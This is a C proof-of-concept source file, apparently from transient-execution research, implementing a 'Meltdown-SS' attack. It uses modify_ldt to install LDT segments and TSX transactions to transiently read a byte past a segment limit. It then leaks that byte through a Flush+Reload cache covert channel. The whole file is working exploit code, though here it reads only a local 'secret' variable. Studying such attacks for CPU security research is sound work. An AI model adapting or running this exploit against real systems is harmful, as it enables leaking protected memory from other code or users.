#define _GNU_SOURCE
#include "cacheutils.h"
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/types.h>
#include <asm/ldt.h>

char mem[4096 * 256];

#define SEGMENT         "es"
#define DO_SEG_FAIL     1

char __attribute__((aligned(0x1000))) secret = 'S';
char __attribute__((aligned(0x1000))) dummy;
unsigned status;

struct user_desc my_desc_ok = {
  .entry_number    = 0,
  .base_addr       = 0x0,
  .limit           = 0xFFFFFF,
  .seg_32bit       = 0x1,
  .contents        = MODIFY_LDT_CONTENTS_DATA,
  .read_exec_only  = 0x0,
  .limit_in_pages  = 0x1,
  .seg_not_present = 0x0,
  .useable         = 0x1
};

struct user_desc my_desc_fail = {
  .entry_number    = 1,
  .base_addr       = 0x0,
  .limit           = 0x1,
  .seg_32bit       = 0x1,
  .contents        = MODIFY_LDT_CONTENTS_DATA,
  .read_exec_only  = 0x0,
  .limit_in_pages  = 0x1,
  .seg_not_present = 0x0,
  .useable         = 0x1
};

void inline __attribute__((always_inline)) seg_ok(void) {
  asm("mov $0x7, %%eax\n\t" /* 0111: 0=idx, 1=LDT, 11=CPL */
      "mov %%eax, %%" SEGMENT "\n\t"
      :::"eax");
}

void inline __attribute__((always_inline)) seg_fail(void) {
  asm("mov $0xf, %%eax\n\t" /* 0111: 1=idx, 1=LDT, 11=CPL */
      "mov %%eax, %%" SEGMENT "\n\t"
      :::"eax");
}

int main(void) {
  if(syscall(__NR_modify_ldt, 1, &my_desc_ok, sizeof(struct user_desc)))
    exit(EXIT_FAILURE);

  if(syscall(__NR_modify_ldt, 1, &my_desc_fail, sizeof(struct user_desc)))
    exit(EXIT_FAILURE);

  memset(mem, 1, sizeof(mem));

  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

  // Flush our shared memory
  for(int i = 0; i < 256; i++) {
    flush(mem + i * 4096);
  }

  for(int r = 0; r < 1000000; r++) {
    // Ensure data is in the cache
    maccess(&secret);
    #if DO_SEG_FAIL
      seg_fail();
    #endif
    // tsx begin
    if(try_start()) {
        // Encode in the cache
        asm("mov dummy, %%ebx\n\t"
            "mov %%" SEGMENT ":secret, %%eax\n\t"
            "shl $0xc, %%eax\n\t"
            "mov (%0, %%eax), %%eax\n\t"
            ::"c"(mem):"eax", "ebx");

      // tsx end
      try_abort();
    }
    try_end();
    seg_ok();

    // Recover data from the covert channel
    for(int i = 1; i < 256; i++) {
      if (flush_reload(mem + i * 4096)) {
        printf("%c ", i);
      }
    }
    flush(&dummy);
  }

  printf("Meltdown-SS done!\n");
  exit(EXIT_SUCCESS);
}
